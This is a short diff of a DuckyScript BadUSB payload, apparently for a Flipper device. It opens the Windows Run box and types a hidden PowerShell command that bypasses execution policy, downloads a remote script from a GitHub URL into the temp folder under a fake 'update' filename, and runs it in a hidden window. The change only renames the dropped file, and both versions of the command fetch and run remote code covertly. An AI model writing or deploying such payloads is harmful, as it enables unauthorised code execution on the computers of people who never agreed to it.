@@ -2,5 +2,5 @@ REM Open Run Box
 GUI r
 DELAY 500
 REM Download to file, then run the file
-STRING powershell -w h -ep bypass -c "iwr 'https://github.com/J-Reboia/TheFunHouse/raw/refs/heads/main/Flipper/BadUsb/Honk/Honk.ps1' -OutFile '$env:TMP\update_2.3.ps1'; Start-Process powershell -ArgumentList '-windowstyle hidden -ep bypass -file $env:TMP\update_2.3.ps1'"
+STRING powershell -w h -ep bypass -c "iwr 'https://github.com/J-Reboia/TheFunHouse/raw/refs/heads/main/Flipper/BadUsb/Honk/Honk.ps1' -OutFile '$env:TMP\update2.ps1'; Start-Process powershell -ArgumentList '-windowstyle hidden -ep bypass -file $env:TMP\update2.ps1'"
 ENTER
